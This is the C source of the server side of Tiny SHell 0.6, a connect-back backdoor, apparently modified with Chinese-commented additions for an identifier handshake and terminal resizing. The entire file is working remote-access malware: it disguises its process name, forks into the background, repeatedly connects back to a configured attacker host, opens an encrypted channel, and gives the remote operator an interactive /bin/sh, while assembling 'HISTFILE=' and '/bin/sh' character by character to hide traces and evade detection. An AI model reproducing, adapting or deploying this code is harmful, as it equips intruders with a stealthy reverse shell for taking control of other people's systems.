/*
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
 #include <termios.h>
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <netdb.h>
 
 /* PTY support requires system-specific #include */
 
 #if defined LINUX || defined OSF
   #include <pty.h>
 #else
 #if defined FREEBSD
   #include <libutil.h>
 #else
 #if defined OPENBSD
   #include <util.h>
 #else
 #if defined SUNOS || defined HPUX
   #include <sys/stropts.h>
 #else
 #if ! defined CYGWIN && ! defined IRIX
   #error Undefined host system
 #endif
 #endif
 #endif
 #endif
 #endif
 
 #include "tsh.h"
 #include "pel.h"
 
 char client_id[MAX_ID_LENGTH] = {0};
 unsigned char message[BUFSIZE + 1];
 
 /* function declaration */
 int tshd_runshell( int client );
 
 /* program entry point */
 
 int main( int argc,char **argv )
 {
     int ret, len, pid, n;
 
     int client;
     struct sockaddr_in client_addr;
     struct hostent *client_host;
     char identifier[MAX_ID_LENGTH + 1] = {0};
 
     if (argc != 2) {
         fprintf(stderr, "Usage: %s <identifier>\n", argv[0]);
         return 1;
     }
     
     // 验证标识符长度
     if (strlen(argv[1]) != MAX_ID_LENGTH) {
         fprintf(stderr, "Identifier must be exactly %d characters\n", MAX_ID_LENGTH);
         return 1;
     }
     strncpy(identifier, argv[1], MAX_ID_LENGTH);

    log_fp = fopen("/tmp/tshd.log", "a+");
    if (log_fp) {
        // 设置无缓冲
        setvbuf(log_fp, NULL, _IONBF, 0);
    }
 
     /* overwrite cmdline */
     memset((void *)argv[0], '\0', strlen(argv[0]));
     strcpy(argv[0], FAKE_PROC_NAME);
 
     /* fork into background */
 
     pid = fork();
 
     if( pid < 0 )
     {
         return( 1 );
     }
 
     if( pid != 0 )
     {
         return( 0 );
     }
 
     /* create a new session */
 
     if( setsid() < 0 )
     {
         return( 2 );
     }
 
     /* close all file descriptors */
 
     for( n = 0; n < 1024; n++ )
     {
        if (log_fp && fileno(log_fp) == n) continue;
        close( n );
     }
 
     while( 1 )
     {
         sleep( CONNECT_BACK_DELAY );
 
         /* create a socket */
 
         client = socket( AF_INET, SOCK_STREAM, 0 );
 
         if( client < 0 )
         {
             continue;
         }
 
         /* resolve the client hostname */
 
         client_host = gethostbyname( CONNECT_BACK_HOST );
 
         if( client_host == NULL )
         {
             continue;
         }
 
         memcpy( (void *) &client_addr.sin_addr,
                 (void *) client_host->h_addr,
                 client_host->h_length );
 
         client_addr.sin_family = AF_INET;
         client_addr.sin_port   = htons( SERVER_PORT );
 
         /* try to connect back to the client */
 
         ret = connect( client, (struct sockaddr *) &client_addr,
                        sizeof( client_addr ) );
 
         if( ret < 0 )
         {
             close( client );
             continue;
         }
 
         // 连接成功后，首先发送标识符
         if (send(client, identifier, MAX_ID_LENGTH, 0) != MAX_ID_LENGTH) {
             close(client);
             continue;
         }
 
         // 等待身份验证结果
         char response;
         if (recv(client, &response, 1, 0) != 1 || response != 1) {
             close(client);
             continue;
         }
 
         /* setup the packet encryption layer */
 
         alarm( 3 );
 
         ret = pel_server_init( client, secret );
 
         if( ret != PEL_SUCCESS )
         {
             shutdown( client, 2 );
             return( 10 );
         }
 
         alarm( 0 );
 
         ret = tshd_runshell( client );
 
         shutdown( client, 2 );
         return( ret );
     }

     if (log_fp) {
            fclose(log_fp);
        }
 
     /* not reached */
 
     return( 13 );
 }
 
 int tshd_runshell( int client )
 {
     fd_set rd;
     struct winsize ws;
     char *slave, *temp, *shell;
     int ret, len, pid, pty, tty, n;
 
     /* request a pseudo-terminal */
 
 #if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF
 
     if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
     {
         return( 24 );
     }
 
     slave = ttyname( tty );
 
     if( slave == NULL )
     {
         return( 25 );
     }
 
 #else
 #if defined IRIX
 
     slave = _getpty( &pty, O_RDWR, 0622, 0 );
 
     if( slave == NULL )
     {
         return( 26 );
     }
 
     tty = open( slave, O_RDWR | O_NOCTTY );
 
     if( tty < 0 )
     {
         return( 27 );
     }
 
 #else
 #if defined CYGWIN || defined SUNOS || defined HPUX
 
     pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY );
 
     if( pty < 0 )
     {
         return( 28 );
     }
 
     if( grantpt( pty ) < 0 )
     {
         return( 29 );
     }
 
     if( unlockpt( pty ) < 0 )
     {
         return( 30 );
     }
 
     slave = ptsname( pty );
 
     if( slave == NULL )
     {
         return( 31 );
     }
 
     tty = open( slave, O_RDWR | O_NOCTTY );
 
     if( tty < 0 )
     {
         return( 32 );
     }
 
 #if defined SUNOS || defined HPUX
 
     if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
     {
         return( 33 );
     }
 
     if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
     {
         return( 34 );
     }
 
 #if defined SUNOS
 
     if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
     {
         return( 35 );
     }
 
 #endif
 #endif
 #endif
 #endif
 #endif
 
     /* just in case bash is run, kill the history file */
 
     temp = (char *) malloc( 10 );
 
     if( temp == NULL )
     {
         return( 36 );
     }
 
     temp[0] = 'H'; temp[5] = 'I';
     temp[1] = 'I'; temp[6] = 'L';
     temp[2] = 'S'; temp[7] = 'E';
     temp[3] = 'T'; temp[8] = '=';
     temp[4] = 'F'; temp[9] = '\0';
 
     putenv( temp );
 
     /* get the TERM environment variable */
 
     ret = pel_recv_msg( client, message, &len );
 
     if( ret != PEL_SUCCESS )
     {
         return( 37 );
     }
 
     message[len] = '\0';
 
     temp = (char *) malloc( len + 6 );
 
     if( temp == NULL )
     {
         return( 38 );
     }
 
     temp[0] = 'T'; temp[3] = 'M';
     temp[1] = 'E'; temp[4] = '=';
     temp[2] = 'R';
 
     strncpy( temp + 5, (char *) message, len + 1 );
 
     putenv( temp );
 
     /* get the window size */
 
     ret = pel_recv_msg( client, message, &len );
 
     if( ret != PEL_SUCCESS || len != 4 )
     {
         return( 39 );
     }
 
     ws.ws_row = ( (int) message[0] << 8 ) + (int) message[1];
     ws.ws_col = ( (int) message[2] << 8 ) + (int) message[3];
 
     ws.ws_xpixel = 0;
     ws.ws_ypixel = 0;
 
     if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
     {
         return( 40 );
     }
 
     /* get the system command */
 
     ret = pel_recv_msg( client, message, &len );
 
     if( ret != PEL_SUCCESS )
     {
         return( 41 );
     }
 
     message[len] = '\0';
 
     temp = (char *) malloc( len + 1 );
 
     if( temp == NULL )
     {
         return( 42 );
     }
 
     strncpy( temp, (char *) message, len + 1 );
 
     /* fork to spawn a shell */
 
     pid = fork();
 
     if( pid < 0 )
     {
         return( 43 );
     }
 
     if( pid == 0 )
     {
         /* close the client socket and the pty (master side) */
 
         close( client );
         close( pty );
 
         /* create a new session */
 
         if( setsid() < 0 )
         {
             return( 44 );
         }
 
         /* set controlling tty, to have job control */
 
 #if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF
 
         if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
         {
             return( 45 );
         }
 
 #else
 #if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX
 
         {
             int fd;
 
             fd = open( slave, O_RDWR );
 
             if( fd < 0 )
             {
                 return( 46 );
             }
 
             close( tty );
 
             tty = fd;
         }
 
 #endif
 #endif
 
         /* tty becomes stdin, stdout, stderr */
 
         dup2( tty, 0 );
         dup2( tty, 1 );
         dup2( tty, 2 );
 
         if( tty > 2 )
         {
             close( tty );
         }
 
         /* fire up the shell */
 
         shell = (char *) malloc( 8 );
 
         if( shell == NULL )
         {
             return( 47 );
         }
 
         shell[0] = '/'; shell[4] = '/';
         shell[1] = 'b'; shell[5] = 's';
         shell[2] = 'i'; shell[6] = 'h';
         shell[3] = 'n'; shell[7] = '\0';
 
         execl( shell, shell + 5, "-c", temp, (char *) 0 );
 
         /* d0h, this shouldn't happen */
 
         return( 48 );
     }
     else
     {
         /* tty (slave side) not needed anymore */
 
         close( tty );
 
         /* let's forward the data back and forth */
 
         while( 1 )
         {
             FD_ZERO( &rd );
             FD_SET( client, &rd );
             FD_SET( pty, &rd );
 
             n = ( pty > client ) ? pty : client;
 
             if( select( n + 1, &rd, NULL, NULL, NULL ) < 0 )
             {
                 return( 49 );
             }
 
             if( FD_ISSET( client, &rd ) )
             {
                 ret = pel_recv_msg( client, message, &len );
 
                 if( ret != PEL_SUCCESS )
                 {
                     return( 50 );
                 }
 
                 if (*(uint32_t*)message == 0xFFFFFFFF) {
                     // 接收到调整窗口大小的标志
                     ws.ws_row = ( (int) message[4] << 8 ) + (int) message[5];
                     ws.ws_col = ( (int) message[6] << 8 ) + (int) message[7];
 
                     ws.ws_xpixel = 0;
                     ws.ws_ypixel = 0;
 
                     ioctl( pty, TIOCSWINSZ, &ws );
 
                     continue;
                 }
                 
                 if( write( pty, message, len ) != len )
                 {
                     return( 51 );
                 }
             }
 
             if( FD_ISSET( pty, &rd ) )
             {
                 len = read( pty, message, BUFSIZE );
 
                 if( len == 0 ) break;
 
                 if( len < 0 )
                 {
                    return( 52 );
                 }
                 
                 ret = pel_send_msg( client, message, len );
 
                 if( ret != PEL_SUCCESS )
                 {
                     return( 53 );
                 }
             }
         }
 
         return( 54 );
     }
 
     /* not reached */
 
     return( 55 );
 } 